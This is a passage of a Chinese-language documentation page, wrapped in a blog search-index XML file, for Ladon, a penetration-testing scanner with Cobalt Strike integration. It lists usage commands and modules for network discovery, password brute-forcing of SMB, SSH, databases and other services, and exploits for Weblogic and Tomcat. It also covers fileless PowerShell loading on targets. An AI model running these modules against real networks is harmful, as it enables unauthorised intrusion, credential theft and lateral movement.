<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ladon大型内网渗透扫描器&amp;Cobalt Strike</title>
    <url>/p/648af4b3.html</url>
    <content><![CDATA[<p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置92个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息</p>
<a id="more"></a>

<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-7.1-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
<h3 id="Ladon-for-Windows"><a href="#Ladon-for-Windows" class="headerlink" title="Ladon for Windows"></a>Ladon for Windows</h3><p><img data-original="http://k8gege.org/k8img/Ladon/Ladon.gif"></p>
<h3 id="Ladon-GUI"><a href="#Ladon-GUI" class="headerlink" title="Ladon GUI"></a>Ladon GUI</h3><p><img data-original="http://k8gege.org/k8img/Ladon/LadonGUI.gif"></p>
<h3 id="Ladon-for-Cobalt-Strike"><a href="#Ladon-for-Cobalt-Strike" class="headerlink" title="Ladon for Cobalt Strike"></a>Ladon for Cobalt Strike</h3><p><img data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p>
<h3 id="Ladon-for-PowerShell"><a href="#Ladon-for-PowerShell" class="headerlink" title="Ladon for PowerShell"></a>Ladon for PowerShell</h3><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
<h3 id="Python-Ladon"><a href="#Python-Ladon" class="headerlink" title="Python Ladon"></a>Python Ladon</h3><p><img data-original="http://k8gege.org/k8img/Ladon//py/PyLadon.PNG"></p>
<h3 id="Ladon-for-Linux"><a href="#Ladon-for-Linux" class="headerlink" title="Ladon for Linux"></a>Ladon for Linux</h3><p><img data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
<thead>
<tr>
<th>ID</th>
<th>主题</th>
<th>URL</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>Ladon文档主页</td>
<td><a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></td>
</tr>
<tr>
<td>1</td>
<td>Ladon基础文档</td>
<td><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></td>
</tr>
<tr>
<td>2</td>
<td>Ladon用法例子</td>
<td><a href="http://k8gege.org/Ladon/example.html">http://k8gege.org/Ladon/example.html</a></td>
</tr>
<tr>
<td>3</td>
<td>基础用法详解</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td>
</tr>
<tr>
<td>4</td>
<td>Cobalt Strike</td>
<td><a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a></td>
</tr>
<tr>
<td>5</td>
<td>Exp生成器使用</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
</tr>
<tr>
<td>6</td>
<td>高度自定义插件</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
</tr>
<tr>
<td>7</td>
<td>外部模块参考</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td>
</tr>
<tr>
<td>8</td>
<td>PowerLadon</td>
<td><a href="https://github.com/k8gege/powerladon" target="_blank" rel="noopener">https://github.com/k8gege/powerladon</a></td>
</tr>
<tr>
<td>9</td>
<td>PythonLadon</td>
<td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td>
</tr>
<tr>
<td>10</td>
<td>LinuxLadon</td>
<td><a href="https://github.com/k8gege/KaliLadon" target="_blank" rel="noopener">https://github.com/k8gege/KaliLadon</a></td>
</tr>
<tr>
<td>12</td>
<td>漏洞演示视频</td>
<td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
</tr>
<tr>
<td>13</td>
<td>Ladon6.0文档</td>
<td><a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a></td>
</tr>
<tr>
<td>14</td>
<td>Ladon6.2文档</td>
<td><a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a></td>
</tr>
<tr>
<td>13</td>
<td>Ladon6.4文档</td>
<td><a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a></td>
</tr>
<tr>
<td>16</td>
<td>Ladon6.5文档</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
</tr>
</tbody></table>
<h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>git clone <a href="https://github.com/k8gege/Ladon.git" target="_blank" rel="noopener">https://github.com/k8gege/Ladon.git</a><br>使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE</p>
<h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。</p>
<h3 id="关于Ladon"><a href="#关于Ladon" class="headerlink" title="关于Ladon"></a>关于Ladon</h3><p>Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br>Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br>杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br>为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br>可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。</p>
<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.1版本内置85个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
<h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p>
<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br>如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透</p>
<h4 id="Linux、Mac"><a href="#Linux、Mac" class="headerlink" title="Linux、Mac"></a>Linux、Mac</h4><p>安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install mono-runtime</span><br><span class="line">wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon</span><br><span class="line">mono Ladon 192.168.1.8/24 OnlinePC</span><br></pre></td></tr></table></figure>

<p>由于mono的兼容性，不保证Mac或Linux下所有功能均可用<br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>测试发现有些功能的稳定性以及速度没有Windows系统快<br>未列功能系未测试或暂不可用功能，使用前请先看说明</p>
<p>实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试</p>
<h3 id="奇葩条件"><a href="#奇葩条件" class="headerlink" title="奇葩条件"></a>奇葩条件</h3><p>实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标<br>有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了<br>Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧<br>还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的</p>
<h3 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h3><p>一条龙服务，为用户提供一个简单易用、功能丰富、高度灵活的扫描工具</p>
<h3 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h3><p>扫描流量小<br>程序体积小<br>功能丰富强大<br>程序简单易用<br>插件支持多种语言<br>跨平台(Win/Kali/Ubuntu)等<br>支持Cobalt Strike插件化<br>支持PowerShell无文件渗透<br>Exp生成器可一键定制Poc<br>多版本适用各种环境</p>
<h3 id="程序参数功能"><a href="#程序参数功能" class="headerlink" title="程序参数功能"></a>程序参数功能</h3><p>1  支持指定IP扫描<br>2  支持指定域名扫描<br>3  支持指定机器名扫描<br>4  支持指定C段扫描(ip/24)<br>5  支持指定B段扫描(ip/16)<br>6  支持指定A段扫描(ip/8)<br>7  支持指定URL扫描<br>8  支持批量IP扫描(ip.txt)<br>9  支持批量C段扫描(ip24.txt)<br>10 支持批量B段扫描(ip16.txt)<br>11 支持批量URL扫描(url.txt)<br>12 支持批量域名扫描(domain.txt)<br>13 支持批量机器名扫描(host.txt)<br>14 支持批量字符串列表(str.txt)<br>15 支持主机帐密列表(check.txt)<br>16 支持用户密码列表(userpass.txt)<br>17 支持指定范围C段扫描<br>18 支持参数加载自定义DLL（仅限C#）<br>19 支持参数加载自定义EXE（仅限C#）<br>20 支持参数加载自定义INI配置文件<br>21 支持参数加载自定义PowerShell<br>22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br>26 INI配置支持自定义程序密码爆破</p>
<h3 id="内置功能模块-58"><a href="#内置功能模块-58" class="headerlink" title="内置功能模块(58)"></a>内置功能模块(58)</h3><h4 id="0x001-资产扫描-11"><a href="#0x001-资产扫描-11" class="headerlink" title="0x001 资产扫描(11)"></a>0x001 资产扫描(11)</h4><p>例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br>例子: Ladon 192.168.1.8/24 OnlinePC</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>返回结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="http://k8gege.org/p/55476.html">Ping</a></td>
<td>存活主机扫描</td>
<td>存活IP(探测速度很快3-6秒/C段)</td>
</tr>
<tr>
<td>2</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a></td>
<td>存活主机扫描</td>
<td>存活IP、Mac地址、机器名、设备制造商</td>
</tr>
<tr>
<td>3</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlineIP</a></td>
<td>仅存活主机IP</td>
<td>存活IP</td>
</tr>
<tr>
<td>4</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E5%9F%9F%E5%90%8DURL%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">UrlScan</a></td>
<td>URL域名扫描</td>
<td>同服URL（不验证IP、域名、Web标题）</td>
</tr>
<tr>
<td>5</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E6%97%81%E7%AB%99%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">SameWeb</a></td>
<td>同服域名扫描</td>
<td>同服URL（验证IP、域名、Web标题）</td>
</tr>
<tr>
<td>6</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebScan</a></td>
<td>Web信息扫描</td>
<td>存活IP、主机名、Banner、Web标题</td>
</tr>
<tr>
<td>7</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebDir</a></td>
<td>后台目录扫描</td>
<td>地址、HTTP状态</td>
</tr>
<tr>
<td>8</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4" target="_blank" rel="noopener">SubDomain</a></td>
<td>子域名爆破</td>
<td>子域名 (可用DomainIP/HostIP解析)</td>
</tr>
<tr>
<td>9</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">DomainIP</a></td>
<td>域名解析IP</td>
<td>域名、IP</td>
</tr>
<tr>
<td>10</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">HostIP</a></td>
<td>主机名转IP</td>
<td>IP、域名</td>
</tr>
<tr>
<td>11</td>
<td><a href="http://k8gege.org/p/39070.html">AdiDnsDump</a></td>
<td>域内机器信息获取(非域内请使用LdapScan探测)</td>
<td>IP、域名</td>
</tr>
</tbody></table>
<h4 id="0x002-指纹识别-服务识别-8"><a href="#0x002-指纹识别-服务识别-8" class="headerlink" title="0x002 指纹识别/服务识别(8)"></a>0x002 指纹识别/服务识别(8)</h4><p>例子: Ladon OsScan<br>例子: Ladon 192.168.1.8/24 OsScan</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>返回结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B" target="_blank" rel="noopener">OsScan</a></td>
<td>操作系统版本探测</td>
<td>存活IP、工作组\机器名、操作系统、开放服务</td>
</tr>
<tr>
<td>2</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB)" target="_blank" rel="noopener">PortScan</a></td>
<td>端口扫描含Banner</td>
<td>主机名、开放端口、服务识别、Banner、Web</td>
</tr>
<tr>
<td>3</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB" target="_blank" rel="noopener">WhatCMS</a></td>
<td>75种Web指纹识别</td>
<td>URL、CMS、邮件系统、登陆页面、中间件(如Apache\Tomecat\IIS)等</td>
</tr>
<tr>
<td>4</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">CiscoScan</a></td>
<td>思科设备扫描</td>
<td>存活IP、设备型号、主机名、Boot、硬件版本</td>
</tr>
<tr>
<td>5</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E5%86%85%E7%BD%91MSSQL%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">EnumMssql</a></td>
<td>枚举Mssql数据库主机</td>
<td>数据库IP、机器名、SQL版本</td>
</tr>
<tr>
<td>6</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90" target="_blank" rel="noopener">EnumShare</a></td>
<td>枚举网络共享资源</td>
<td>域、存活IP、共享路径</td>
</tr>
<tr>
<td>7</td>
<td><a href="http://k8gege.org/p/39070.html">LdapScan</a></td>
<td>不指定密码时，仅探测LDAP服务器</td>
<td>IP是否LDAP服务器</td>
</tr>
<tr>
<td>8</td>
<td><a href="http://k8gege.org/p/39070.html">FtpScan</a></td>
<td>不指定密码时，仅探测FTP服务器</td>
<td>IP是否FTP服务器</td>
</tr>
</tbody></table>
<h4 id="0x003-口令检测-密码爆破-16"><a href="#0x003-口令检测-密码爆破-16" class="headerlink" title="0x003 口令检测/密码爆破(16)"></a>0x003 口令检测/密码爆破(16)</h4><p>[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]</p>
<p>例子: Ladon SshScan<br>例子: Ladon 192.168.1.8/24 SshScan<br>例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br>例子: Ladon test.rar RarScan</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>返回结果</th>
<th>依赖</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="http://k8gege.org/Ladon/SmbScan.html">SmbScan</a></td>
<td>SMB密码爆破(Windows)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td><a href="http://k8gege.org/Ladon/WmiScan.html">WmiScan</a></td>
<td>Wmi密码爆破(Windowns)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td><a href="http://k8gege.org/Ladon/NbtScan.html">NbtScan</a></td>
<td>Ipc密码爆破(Windows)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td><a href="http://k8gege.org/p/56393.html">LdapScan</a></td>
<td>AD域密码爆破(Windows)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td><a href="http://k8gege.org/Ladon/SmbHashScan.html">SmbHashScan</a></td>
<td>SMB HASH密码爆破(Windows)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td><a href="http://k8gege.org/Ladon/WmiHashScan.html">WmiHashScan</a></td>
<td>WMI HASH密码爆破(Windows)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td><a href="http://k8gege.org/Ladon/sshscan.html">SshScan</a></td>
<td>SSH密码爆破(Linux)</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>8</td>
<td><a href="http://k8gege.org/Ladon/MssqlScan.html">MssqlScan</a></td>
<td>Mssql数据库密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>9</td>
<td><a href="http://k8gege.org/Ladon/OracleScan.html">OracleScan</a></td>
<td>Oracle数据库密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>10</td>
<td><a href="http://k8gege.org/Ladon/MysqlScan.html">MysqlScan</a></td>
<td>Mysql数据库密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>11</td>
<td><a href="http://k8gege.org/Ladon/weblogicScan.html">WeblogicScan</a></td>
<td>Weblogic后台密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>12</td>
<td><a href="http://k8gege.org/Ladon/VncScan.html">VncScan</a></td>
<td>VNC远程桌面密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>13</td>
<td><a href="http://k8gege.org/Ladon/ftpscan.html">FtpScan</a></td>
<td>Ftp服务器密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>14</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Rar%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3" target="_blank" rel="noopener">RarScan</a></td>
<td>Rar压缩包密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td>Rar.exe</td>
</tr>
<tr>
<td>15</td>
<td><a href="http://k8gege.org/Ladon/TomcatScan.html">TomcatScan</a></td>
<td>Tomcat后台登陆密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>16</td>
<td><a href="http://k8gege.org/Ladon/HttpbasicScan.html">HttpBasicScan</a></td>
<td>HttpBasic401认证密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
<tr>
<td>17</td>
<td><a href="http://k8gege.org/Ladon/WinrmScan.html">WinrmScan</a></td>
<td>Winrm认证密码爆破</td>
<td>检测过程、成功密码、LOG文件</td>
<td></td>
</tr>
</tbody></table>
<h4 id="0x004-漏洞检测-漏洞利用-9"><a href="#0x004-漏洞检测-漏洞利用-9" class="headerlink" title="0x004 漏洞检测/漏洞利用(9)"></a>0x004 漏洞检测/漏洞利用(9)</h4><p>例子: Ladon MS17010<br>例子: Ladon 192.168.1.8/24 MS17010<br>例子: Ladon <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> WeblogicExp</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-MS17010%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">MS17010</a></td>
<td>SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)</td>
</tr>
<tr>
<td>2</td>
<td><a href="http://k8gege.org/Ladon/example.html">SMBGhost</a></td>
<td>SMBGhost远程溢出漏洞检测 （CVE-2020-0796）</td>
</tr>
</tbody></table>
<p>3 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicPoc</a> | Weblogic漏洞检测(CVE-2019-2725/<a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">CVE-2018-2894</a>)<br>4 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">PhpStudyPoc</a> |  PhpStudy后门检测(phpstudy 2016/phpstudy 2018)<br>5 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F--CVE-2016-3088" target="_blank" rel="noopener">ActivemqPoc</a> |  ActiveMQ漏洞检测(CVE-2016-3088)<br>6 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2017-12615" target="_blank" rel="noopener">TomcatPoc</a>  | Tomcat漏洞检测(CVE-2017-12615)<br>7 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicExp</a> | Weblogic漏洞利用(CVE-2019-2725)<br>8 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2017-12615" target="_blank" rel="noopener">TomcatExp</a>  | Tomcat漏洞利用(CVE-2017-12615)<br>9 | <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-Struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">Struts2Poc</a> | Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</p>
<h4 id="0x005-加密解密-4"><a href="#0x005-加密解密-4" class="headerlink" title="0x005 加密解密(4)"></a>0x005 加密解密(4)</h4><p>例子: Ladon 字符串 EnHex<br>例子: Ladon EnHex (批量str.txt)</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnHex</a></td>
<td>批量Hex密码加密</td>
</tr>
<tr>
<td>2</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeHex</a></td>
<td>批量Hex密码解密</td>
</tr>
<tr>
<td>3</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnBase64</a></td>
<td>批量Base64密码加密</td>
</tr>
<tr>
<td>4</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeBase64</a></td>
<td>批量Base64密码解密</td>
